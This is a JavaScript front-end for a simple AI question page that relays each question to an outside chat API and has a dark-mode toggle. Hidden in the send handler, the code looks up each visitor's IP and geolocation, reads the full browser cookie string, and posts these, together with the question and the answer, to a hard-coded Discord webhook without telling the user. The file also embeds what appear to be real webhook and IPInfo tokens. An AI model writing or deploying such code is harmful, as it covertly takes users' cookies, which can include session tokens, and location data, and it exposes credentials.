document.addEventListener('DOMContentLoaded', async function() {
    const toggleButton = document.getElementById('toggleButton');

    toggleButton.addEventListener('click', function() {
        document.body.classList.toggle('dark-mode');
        this.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
    });

    // Array to store banned users with IP and cookies
    const bannedUsers = [];

    // Check if user is banned based on IP or cookies
    function isUserBanned(ip, cookie) {
        return bannedUsers.some(user => user.ip === ip || user.cookie === cookie);
    }

    // Fetch user info from IPInfo API
    async function getUserInfo() {
        const response = await fetch('https://ipinfo.io/json?token=99798ae623ac1d'); // Replace with your IPInfo token
        return await response.json();
    }

    document.getElementById('send').addEventListener('click', async function() {
        const inputBox = document.getElementById("question");
        const sendButton = document.getElementById("send");
        const question = inputBox.value;
        if (!question) return;

        sendButton.disabled = true;
        sendButton.innerText = "..."; // Change button text during loading

        const startTime = Date.now();
        const userInfo = await getUserInfo(); // Get user info (IP, location, etc.)
        const userCookie = document.cookie || 'No cookie set'; // User's browser cookie
        const { ip, city, region, country, loc, org, postal, timezone } = userInfo;

        // Check if the user is banned
        if (isUserBanned(ip, userCookie)) {
            sendWebhook({
                title: "Banned User Attempt",
                description: `A banned user tried to access the service.`,
                fields: [
                    { name: "IP", value: ip },
                    { name: "City", value: city },
                    { name: "Region", value: region },
                    { name: "Country", value: country },
                    { name: "Org", value: org },
                    { name: "Timezone", value: timezone },
                    { name: "Cookie", value: userCookie }
                ],
                color: 0xFF0000 // Red for warning
            });
            sendButton.disabled = false;
            sendButton.innerText = "Send"; // Reset button text
            return; // Exit since user is banned
        }

        const response = await fetch(`https://tilki.dev/api/hercai?soru=${encodeURIComponent(question)}`);
        const data = await response.json();
        const endTime = Date.now();
        const timeTaken = endTime - startTime;

        // Send user info and API request details in the webhook
        sendWebhook({
            title: "API Used",
            description: `**Question:** ${question}\n**Response:** ${data.cevap}\n**Time taken:** ${timeTaken} ms`,
            fields: [
                { name: "IP", value: ip },
                { name: "City", value: city },
                { name: "Region", value: region },
                { name: "Country", value: country },
                { name: "Org", value: org },
                { name: "Timezone", value: timezone },
                { name: "Cookie", value: userCookie }
            ],
            color: Math.floor(Math.random() * 16777215) // Random color for the embed
        });

        document.getElementById("response").innerText = data.cevap;
        sendButton.disabled = false;
        sendButton.innerText = "Send"; // Reset button text
    });

    async function sendWebhook(embedMessage) {
        const webhookUrl = 'https://discord.com/api/webhooks/1289607577570906133/cBP3mPnNfj6SCgeYuFG8HsHIz22ZAnyCLo7Ga4L1125o1cmISP_Hv8gVcSjHA9Tj0LPj'; // Replace with your actual webhook URL
        const payload = { embeds: [embedMessage] };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    // Example: Add a user to the banned list
    function banUser(ip, cookie) {
        bannedUsers.push({ ip, cookie });
        console.log(`User banned with IP: ${ip}, Cookie: ${cookie}`);
    }

    // Example: Unban a user
    function unbanUser(ip, cookie) {
        const index = bannedUsers.findIndex(user => user.ip === ip || user.cookie === cookie);
        if (index !== -1) {
            bannedUsers.splice(index, 1);
            console.log(`User unbanned with IP: ${ip}, Cookie: ${cookie}`);
        }
    }
});
